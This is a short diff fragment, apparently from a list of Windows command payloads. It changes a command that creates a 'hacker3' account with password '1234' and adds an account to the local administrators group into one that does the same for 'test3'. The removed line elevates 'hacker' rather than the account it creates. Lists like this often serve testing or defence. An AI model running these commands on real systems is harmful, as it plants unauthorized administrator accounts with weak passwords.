@@ -31,4 +31,4 @@
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
-cmd.exe /c net user hacker3 1234 /add && net localgroup administrators hacker /add
+net user test3 1234 /add && net localgroup administrators test3 /add
